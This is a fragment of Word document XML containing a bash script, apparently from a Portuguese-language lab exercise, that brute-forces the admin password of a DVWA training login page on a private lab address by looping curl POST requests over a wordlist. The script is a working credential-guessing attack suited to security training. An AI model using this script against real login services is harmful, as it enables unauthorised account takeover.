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bruteforce.sh</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>#!/bin/bash</w:t>
        <w:br/>
        <w:br/>
        <w:t>URL="http://192.168.56.101/dvwa/login.php"</w:t>
        <w:br/>
        <w:t>WORDLIST="wordlist.txt"</w:t>
        <w:br/>
        <w:t>USER="admin"</w:t>
        <w:br/>
        <w:br/>
        <w:t>echo "[*] Iniciando brute force no DVWA..."</w:t>
        <w:br/>
        <w:t>sleep 1</w:t>
        <w:br/>
        <w:br/>
        <w:t>for pass in $(cat $WORDLIST); do</w:t>
        <w:br/>
        <w:t xml:space="preserve">    RESPONSE=$(curl -s -X POST \</w:t>
        <w:br/>
        <w:t xml:space="preserve">        -d "username=$USER&amp;password=$pass&amp;Login=Login" \</w:t>
        <w:br/>
        <w:t xml:space="preserve">        $URL)</w:t>
        <w:br/>
        <w:br/>
        <w:t xml:space="preserve">    echo "[*] Testando senha: $pass"</w:t>
        <w:br/>
        <w:br/>
        <w:t xml:space="preserve">    echo "$RESPONSE" | grep -q "Login failed"</w:t>
        <w:br/>
        <w:br/>
        <w:t xml:space="preserve">    if [ $? -ne 0 ]; then</w:t>
        <w:br/>
        <w:t xml:space="preserve">        echo ""</w:t>
        <w:br/>
        <w:t xml:space="preserve">        echo "[+] Senha encontrada!"</w:t>
        <w:br/>
        <w:t xml:space="preserve">        echo "Usuário: $USER"</w:t>
        <w:br/>
        <w:t xml:space="preserve">        echo "Senha: $pass"</w:t>
        <w:br/>
        <w:t xml:space="preserve">        exit 0</w:t>
        <w:br/>
        <w:t xml:space="preserve">    fi</w:t>
        <w:br/>
        <w:t>done</w:t>
        <w:br/>
        <w:br/>
        <w:t>echo "[!] Nenhuma senha válida encontrada."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